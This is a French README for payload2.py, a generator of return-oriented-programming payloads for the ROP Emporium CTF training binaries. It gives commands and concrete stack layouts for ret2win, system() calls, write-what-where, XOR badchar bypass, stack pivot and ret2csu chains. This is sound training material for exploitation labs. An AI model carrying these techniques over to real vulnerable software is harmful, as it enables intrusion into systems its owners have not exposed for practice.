# payload2.py - guide ROP Emporium

Ce guide explique comment utiliser `payload2.py` comme generateur de payloads pour des binaires x86_64 Linux de TP/CTF.

Le script ne devine pas magiquement tous les gadgets. Son role est de construire proprement le payload une fois que tu as trouve les adresses avec `ROPgadget`, `rabin2`, `objdump`, `readelf` ou `pwndbg`.

## Idee generale

Un payload ROP est souvent de cette forme:

```text
padding jusqu'au saved RIP
adresse gadget 1
valeur consommee par gadget 1
adresse gadget 2
valeur consommee par gadget 2
adresse fonction utile
```

`payload2.py` automatise:

- la recherche de l'offset avec `cyclic()`;
- la construction du padding;
- le packing des adresses en little-endian 64 bits;
- l'ecriture du fichier `payload.bin`;
- l'envoi en `stdin` ou en `argv`;
- le rangement des corefiles dans `core/`.

## Options globales importantes

```bash
--target ./bin
```

Binaire attaque.

```bash
--input stdin
```

Envoie le payload sur `stdin`. C'est le cas de la plupart des challenges ROP Emporium, car ils utilisent `read()`.

```bash
--input argv
```

Passe le payload comme argument du programme. Attention aux octets NUL.

```bash
--offset 40
```

Force l'offset. Si tu ne le donnes pas, le script tente de le trouver automatiquement.

```bash
--run
```

Execute la cible avec le payload final.

```bash
--cwd target-dir
```

Lance la cible depuis son propre dossier. C'est le defaut. Utile pour `flag.txt`.

```bash
--core-dir core
```

Deplace les corefiles dans `core/`.

## Trouver les adresses

Trouver une string:

```bash
rabin2 -z ./split | grep flag
```

Verifier une string dans pwndbg:

```gdb
x/s 0x601060
```

Trouver `system@plt`:

```bash
objdump -d ./split | grep system@plt
```

Trouver `pop rdi ; ret`:

```bash
ROPgadget --binary ./split | grep "pop rdi"
```

Trouver des gadgets `ret`:

```bash
ROPgadget --binary ./split | grep " : ret$"
```

## Mode jump

Usage:

```bash
python3 payload2.py --run --input stdin --target ./ret2win jump --addr 0x400757
```

Payload construit:

```text
"A" * offset
0x400757
```

Utilisation typique:

- `ret2win`;
- fonction `win()`;
- fonction utile sans argument.

Si l'adresse officielle de la fonction plante, essaye parfois `fonction + 1` pour sauter le `push rbp`, comme dans `ret2win`.

## Mode system

Usage:

```bash
python3 payload2.py --run --input stdin --target ./split system \
  --ret 0x400741 \
  --pop-rdi 0x4007c3 \
  --cmd-addr 0x601060 \
  --system-addr 0x400560
```

Payload construit:

```text
"A" * offset
0x400741      # ret, alignement
0x4007c3      # pop rdi ; ret
0x601060      # adresse de "/bin/cat flag.txt"
0x400560      # system@plt
```

Effet:

```c
system("/bin/cat flag.txt");
```

Utilisation typique:

- `split`;
- tout challenge ou une string de commande existe deja en memoire.

## Mode call

Ce mode appelle une ou plusieurs fonctions avec des arguments.

### Exemple callme

Trouve le gadget:

```bash
ROPgadget --binary ./callme | grep "pop rdi"
```

Dans ROP Emporium `callme`, tu as souvent un gadget du style:

```asm
pop rdi ; pop rsi ; pop rdx ; ret
```

Commande:

```bash
python3 payload2.py --run --input stdin --target ./callme call \
  --pop-rdi-rsi-rdx 0x40093c \
  --arg-rdi 1 \
  --arg-rsi 2 \
  --arg-rdx 3 \
  --func 0x400720 \
  --func 0x400740 \
  --func 0x4006f0
```

Payload construit:

```text
"A" * offset
pop rdi ; pop rsi ; pop rdx ; ret
1
2
3
callme_one@plt
pop rdi ; pop rsi ; pop rdx ; ret
1
2
3
callme_two@plt
pop rdi ; pop rsi ; pop rdx ; ret
1
2
3
callme_three@plt
```

### Appel avec gadgets separes

```bash
python3 payload2.py --run --input stdin --target ./bin call \
  --pop-rdi 0x401123 --arg-rdi 0xdeadbeef \
  --pop-rsi 0x401125 --arg-rsi 2 \
  --pop-rdx 0x401127 --arg-rdx 3 \
  --func 0x401050
```

## Mode write

Ce mode ecrit une chaine en memoire avec des gadgets write-what-where.

Schema:

```text
pop destination ; pop valeur ; ret
destination
valeur
mov [destination], valeur ; ret
```

### Exemple write4

Trouver une zone writable:

```bash
readelf -S ./write4 | grep -E ".data|.bss"
```

Trouver les gadgets:

```bash
ROPgadget --binary ./write4 | grep "pop"
ROPgadget --binary ./write4 | grep "mov"
```

Commande:

```bash
python3 payload2.py --run --input stdin --target ./write4 write \
  --where 0x601028 \
  --data "flag.txt" \
  --nul-terminate \
  --pop-write 0x400690 \
  --write-gadget 0x400628 \
  --write-order dst-value \
  --pop-rdi 0x400693 \
  --call-addr 0x400510
```

Effet:

```text
ecrit "flag.txt\0" en 0x601028
met 0x601028 dans rdi
appelle print_file@plt
```

Si ton gadget pop est `pop r14 ; pop r15 ; ret` et ton gadget mov est `mov [r14], r15 ; ret`, utilise:

```bash
--write-order dst-value
```

Si ton gadget pop est `pop r12 ; pop r13 ; ret` et ton gadget mov est `mov [r13], r12 ; ret`, utilise:

```bash
--write-order value-dst
```

## Mode badchars

Ce mode sert quand certains octets sont interdits dans ton payload.

Principe:

1. La chaine originale est encodee avec XOR.
2. La chaine encodee est ecrite en memoire.
3. Une boucle de gadgets XOR decode chaque octet en memoire.
4. Le script appelle ensuite une fonction avec l'adresse de la chaine decodee.

Exemple:

```bash
python3 payload2.py --run --input stdin --target ./badchars badchars \
  --where 0x601038 \
  --data "flag.txt" \
  --nul-terminate \
  --badchars "0x78 0x67 0x61 0x2e" \
  --xor-key 2 \
  --pop-write 0x40069c \
  --write-gadget 0x400634 \
  --write-order value-dst \
  --pop-xor 0x4006a0 \
  --xor-gadget 0x400628 \
  --xor-order key-addr \
  --pop-rdi 0x4006a3 \
  --call-addr 0x400510
```

Adapte `--xor-order` selon ton gadget:

```text
key-addr  -> pop key ; pop address ; ret
addr-key  -> pop address ; pop key ; ret
```

## Mode pivot

Ce mode genere la petite payload qui remplace `rsp` par une adresse controlee.

Cas classique:

```asm
pop rax ; ret
xchg rax, rsp ; ret
```

Commande:

```bash
python3 payload2.py --input stdin --target ./pivot pivot \
  --pivot-addr 0x7ffff7ffbf10 \
  --pop-rax 0x4009bb \
  --xchg-rax-rsp 0x4009bd
```

Payload:

```text
"A" * offset
pop rax ; ret
pivot_addr
xchg rax, rsp ; ret
```

Si tu as un gadget direct:

```bash
python3 payload2.py --input stdin --target ./pivot pivot \
  --pivot-addr 0x7ffff7ffbf10 \
  --pop-rsp 0x400a2d
```

Pour le challenge `pivot`, tu dois souvent envoyer deux choses:

1. une grosse chaine ROP a l'adresse heap fournie par le programme;
2. une petite payload de pivot qui met `rsp` sur cette adresse.

Le mode `pivot` construit la deuxieme partie.

## Mode ret2csu

Ce mode sert quand tu dois controler `rdi`, `rsi`, `rdx`, mais que tu n'as pas de gadgets simples.

Il utilise deux gadgets de `__libc_csu_init`:

```asm
pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
mov rdx,r15 ; mov rsi,r14 ; mov edi,r13d ; call [r12+rbx*8] ; ...
```

Commande type:

```bash
python3 payload2.py --run --input stdin --target ./ret2csu ret2csu \
  --csu-pop 0x40089a \
  --csu-call 0x400880 \
  --call-ptr 0x600e48 \
  --arg-rdi 0xdeadbeefdeadbeef \
  --arg-rsi 0xcafebabecafebabe \
  --arg-rdx 0xd00df00dd00df00d \
  --next-addr 0x4007b1
```

Attention: `--call-ptr` n'est pas toujours l'adresse directe de la fonction. C'est souvent l'adresse d'une entree GOT ou d'un pointeur vers fonction, parce que le gadget fait:

```asm
call [r12 + rbx*8]
```

## Mode compose

Ce mode est le plus libre. Il assemble exactement ce que tu demandes.

Types:

```text
addr:0x401000     adresse 64 bits
u64:0x1234        entier 64 bits
u32:0x1234        entier 32 bits
byte:0x41         un octet
hex:414243        octets bruts
str:ABC           texte
file:stage2.bin   contenu d'un fichier
```

Exemple equivalent a `split`:

```bash
python3 payload2.py --run --input stdin --target ./split compose \
  --part addr:0x400741 \
  --part addr:0x4007c3 \
  --part addr:0x601060 \
  --part addr:0x400560
```

Utilise `compose` pour:

- `fluff`;
- des chains tres specifiques;
- tester rapidement une hypothese;
- ajouter un morceau non prevu par les modes specialises.

## Mapping ROP Emporium

| Challenge | Mode conseille | Idee |
| --- | --- | --- |
| ret2win | `jump` | Sauter vers `ret2win` ou `ret2win+1`. |
| split | `system` | `system("/bin/cat flag.txt")`. |
| callme | `call` | Appeler trois fonctions avec `rdi=1`, `rsi=2`, `rdx=3`. |
| write4 | `write` | Ecrire `flag.txt` en `.data` puis appeler `print_file`. |
| badchars | `badchars` | Ecrire une version encodee, decoder en memoire, appeler `print_file`. |
| fluff | `compose` | Construire la chain a la main avec les gadgets imposes. |
| pivot | `pivot` + `chain`/`compose` | Envoyer une stage2, puis pivoter `rsp` vers elle. |
| ret2csu | `ret2csu` | Utiliser les gadgets CSU pour controler `rdi/rsi/rdx`. |

## Limites

Le script est un generateur, pas un solveur automatique. Il ne remplace pas l'analyse:

- il ne trouve pas automatiquement tous les gadgets;
- il ne sait pas confirmer seul qu'un gadget a le bon ordre de registres;
- il ne resout pas automatiquement les leaks libc;
- il ne construit pas une strategie complete de pivot en deux envois sans que tu donnes les adresses.

Par contre, une fois les adresses connues, il evite les erreurs classiques:

- mauvais offset;
- mauvaise taille d'adresse entre `stdin` et `argv`;
- packing endian incorrect;
- corefiles partout dans le dossier;
- payload difficile a relire;
- chaine ROP construite a la main avec des oublis.

